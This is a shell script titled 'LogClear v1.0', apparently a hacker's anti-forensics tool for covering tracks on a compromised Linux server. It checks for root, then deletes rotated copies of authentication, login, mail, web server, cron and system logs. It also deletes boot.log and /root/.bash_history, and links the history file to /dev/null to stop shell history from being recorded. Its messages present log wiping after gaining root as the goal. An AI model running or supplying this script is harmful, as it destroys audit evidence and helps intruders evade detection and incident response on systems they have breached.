#!/bin/sh

clear

echo
echo ""
echo "                                      LogClear v1.0 by xlogic"
echo ""
echo " 	                              My E-mail  :xlogic@cosmo.com"
echo ""
echo
	
echo "[=] Checking for Permission.."
id=`whoami`

  if [ $id = "root" ]; then

  echo "[d] Ok,you got root access,now let's clean the fucking logs"
else
  echo "[x] Fuck,you don't have root access to this server and I can't clean the logs"
exit 1
fi

UTMP="/var/run/utmp"
WTMP="/var/log/wtmp"
LASTLOG="/var/log/lastlog"
MESSAGES="/var/log/messages"
SECURE="/var/log/secure"
XFERLOG="/var/log/xferlog"
MAILLOG="/var/log/maillog"
WARN="/var/log/warn"
MAIL="/var/log/mail"
NETCONF="/var/log/netconf.log"
SPOOLER="/var/log/spooler"
CRON="/var/log/cron"
BOOTLOG="/var/log/boot.log"
HTTMA="/var/log/htmlaccess.log"
HTTPDA="/var/log/httpd/access_log"
HTTPDE="/var/log/httpd/error_log"


  echo "[+] Starting cleaning process.."
 echo 
 echo " [-] OK Let's start with $UTMP"
 echo
 
 if [ -f $UTMP ]; then
 rm -rf /var/run/utmp.1
 rm -rf /var/run/utmp.2
 rm -rf /var/run/utmp.3
 rm -rf /var/run/utmp.4
 rm -rf /var/run/utmp.5
 rm -rf /var/run/utmp.6
 rm -rf /var/run/utmp.7
 rm -rf /var/run/utmp.8
 rm -rf /var/run/utmp.9
 rm -rf /var/run/utmp.10
 fi 
 
 echo
 echo "[-] OK Let's go on with $WTMP"
 echo
 
 if [ -f $WTMP ]; then
 rm -rf /var/log/wtmp.1
 rm -rf /var/log/wtmp.2
 rm -rf /var/log/wtmp.3
 rm -rf /var/log/wtmp.4
 rm -rf /var/log/wtmp.5
 rm -rf /var/log/wtmp.6
 rm -rf /var/log/wtmp.7     
 rm -rf /var/log/wtmp.8
 rm -rf /var/log/wtmp.9
 rm -rf /var/log/wtmp.10
 fi
 
 echo
 echo "[-] OK Let's look at $LASTLOG"
 echo 
 
 if [ -f $LASTLOG ]; then
 rm -rf /var/log/lastlog.1
 rm -rf /var/log/lastlog.2
 rm -rf /var/log/lastlog.3
 rm -rf /var/log/lastlog.4
 rm -rf /var/log/lastlog.5
 rm -rf /var/log/lastlog.6
 rm -rf /var/log/lastlog.7
 rm -rf /var/log/lastlog.8
 rm -rf /var/log/lastlog.9
 rm -rf /var/log/lastlog.10
 fi 

echo
echo "[-] OK lets go to $MESSAGES "
echo 
  
  if [ -f $MESSAGES ]; then
 rm -rf /var/log/messages.1
 rm -rf /var/log/messages.2
 rm -rf /var/log/messages.3
 rm -rf /var/log/messages.4
 rm -rf /var/log/messages.5
 rm -rf /var/log/messages.6
 rm -rf /var/log/messages.7
 rm -rf /var/log/messages.8
 rm -rf /var/log/messages.9
 rm -rf /var/log/messages.10
 fi

echo
echo "[-] OK lets go to $SECURE "
echo
 
 if [ -f $SECURE ]; then
  rm -rf /var/log/secure.1
  rm -rf /var/log/secure.2
  rm -rf /var/log/secure.3
  rm -rf /var/log/secure.4
  rm -rf /var/log/secure.5
  rm -rf /var/log/secure.6
  rm -rf /var/log/secure.7
  rm -rf /var/log/secure.8
  rm -rf /var/log/secure.9
  rm -rf /var/log/secure.10
  fi

echo 
echo "[-] OK lets go to $XFERLOG "
echo 
     
   if [ -f $XFERLOG ]; then    
 
    rm -rf /var/log/xferlog.1
    rm -rf /var/log/xferlog.2
    rm -rf /var/log/xferlog.3
    rm -rf /var/log/xferlog.4
    rm -rf /var/log/xferlog.5
    rm -rf /var/log/xferlog.6
    rm -rf /var/log/xferlog.7
    rm -rf /var/log/xferlog.8
    rm -rf /var/log/xferlog.9
    rm -rf /var/log/xferlog.10
    fi
echo 
echo "[-] OK lets go to $MAILLOG "
echo 
 
     if [ -f $MAILLOG ]; then
   
    rm -rf /var/log/maillog.1
   rm -rf /var/log/maillog.2
 rm -rf /var/log/maillog.3
 rm -rf /var/log/maillog.4
 rm -rf /var/log/maillog.5
 rm -rf /var/log/maillog.6
 rm -rf /var/log/maillog.7
 rm -rf /var/log/maillog.8
 rm -rf /var/log/maillog.9
 rm -rf /var/log/maillog.10
 fi

echo 
echo "[-] OK lets go to $WARN "
echo 
  
      if [ -f $WARN ]; then
  rm -rf /var/log/warn.1
  rm -rf /var/log/warn.2
  rm -rf /var/log/warn.3
  rm -rf /var/log/warn.4
  rm -rf /var/log/warn.5
  rm -rf /var/log/warn.6 
  rm -rf /var/log/warn.7 
  rm -rf /var/log/warn.8
  rm -rf /var/log/warn.9
  rm -rf /var/log/warn.10
  fi

echo 
echo "[-] OK lets go to $MAIL "
echo 
 
   if [ -f $MAIL ]; then
  rm -rf /var/log/mail.1
  rm -rf /var/log/mail.2
  rm -rf /var/log/mail.3
  rm -rf /var/log/mail.4
  rm -rf /var/log/mail.5
  rm -rf /var/log/mail.6
  rm -rf /var/log/mail.7
  rm -rf /var/log/mail.8
  rm -rf /var/log/mail.9
  rm -rf /var/log/mail.10
  fi

echo 
echo "[-] OK lets go to $HTTPDA "
echo 
  
  if [ -f $HTTPDA ]; then
  rm -rf /var/log/httpd/access_log.1
  rm -rf /var/log/httpd/access_log.2
  rm -rf /var/log/httpd/access_log.3
  rm -rf /var/log/httpd/access_log.4
  rm -rf /var/log/httpd/access_log.5
  rm -rf /var/log/httpd/access_log.6
  rm -rf /var/log/httpd/access_log.7
  rm -rf /var/log/httpd/access_log.8
  rm -rf /var/log/httpd/access_log.9
  rm -rf /var/log/httpd/access_log.10
  fi

echo 
echo "[-] OK lets go to $HTTPDE "
echo 

    if [ -f $HTTPDE ]; then
  rm -rf /var/log/httpd/error_log.1
  rm -rf /var/log/httpd/error_log.2
  rm -rf /var/log/httpd/error_log.3
  rm -rf /var/log/httpd/error_log.4
  rm -rf /var/log/httpd/error_log.4
  rm -rf /var/log/httpd/error_log.5
  rm -rf /var/log/httpd/error_log.6
  rm -rf /var/log/httpd/error_log.7
  rm -rf /var/log/httpd/error_log.8
  rm -rf /var/log/httpd/error_log.9
  rm -rf /var/log/httpd/error_log.10
  fi

echo 
echo "[-] OK lets go to $NETCONF "
echo 
     
  if [ -f $NETCONF ]; then
 rm -rf /var/log/netconf.log.1
 rm -rf /var/log/netconf.log.2
 rm -rf /var/log/netconf.log.3
 rm -rf /var/log/netconf.log.4
 rm -rf /var/log/netconf.log.5
 rm -rf /var/log/netconf.log.6
 rm -rf /var/log/netconf.log.7
 rm -rf /var/log/netconf.log.8
 rm -rf /var/log/netconf.log.9
 rm -rf /var/log/netconf.log.10
 fi


echo 
echo "[-] OK lets go to $SPOOLER "
echo
 
  if [ -f $SPOOLER ]; then 
 rm -rf /var/log/spooler.1
 rm -rf /var/log/spooler.2
 rm -rf /var/log/spooler.3
 rm -rf /var/log/spooler.4
 rm -rf /var/log/spooler.5
 rm -rf /var/log/spooler.6
 rm -rf /var/log/spooler.7
 rm -rf /var/log/spooler.8
 rm -rf /var/log/spooler.9
 rm -rf /var/log/spooler.10
 fi 

echo 
echo "[-] OK lets go to $BOOTLOG "
echo

  if [ -f $BOOTLOG ]; then
   rm -rf /var/log/boot.log
  rm -rf /var/log/boot.log.1
  rm -rf /var/log/boot.log.2
  rm -rf /var/log/boot.log.3
  rm -rf /var/log/boot.log.4
  rm -rf /var/log/boot.log.5
  rm -rf /var/log/boot.log.6
  rm -rf /var/log/boot.log.7
  rm -rf /var/log/boot.log.8
  rm -rf /var/log/boot.log.9
  rm -rf /var/log/boot.log.10
  fi

echo 
echo "[-] OK lets go to $CRON "
echo

  if [ -f $CRON ]; then
  rm -rf /var/log/cron.1
  rm -rf /var/log/cron.2
  rm -rf /var/log/cron.3
  rm -rf /var/log/cron.4
  rm -rf /var/log/cron.5
  rm -rf /var/log/cron.6
  rm -rf /var/log/cron.7
  rm -rf /var/log/cron.8
  rm -rf /var/log/cron.9
  rm -rf /var/log/cron.10
  fi

echo 
echo "[-] OK lets go to $HTTMA "
echo

 if [ -f $HTTMA ]; then
  rm -rf /var/log/htmlaccess.log.1
  rm -rf /var/log/htmlaccess.log.2
  rm -rf /var/log/htmlaccess.log.3
  rm -rf /var/log/htmlaccess.log.4
  rm -rf /var/log/htmlaccess.log.5
  rm -rf /var/log/htmlaccess.log.6
  rm -rf /var/log/htmlaccess.log.7
  rm -rf /var/log/htmlaccess.log.8
  rm -rf /var/log/htmlaccess.log.9
  rm -rf /var/log/htmlaccess.log.10
  fi

echo
echo "[+] OK ALL LOGS are now Clear...but all commands are logged in .Bash_history, lets clean it!"
echo
 rm -rf /root/.bash_history 
 ln -s /dev/null /root/.bash_history 
echo
echo "[=] All Done Sire :>"
echo

exit 0
 
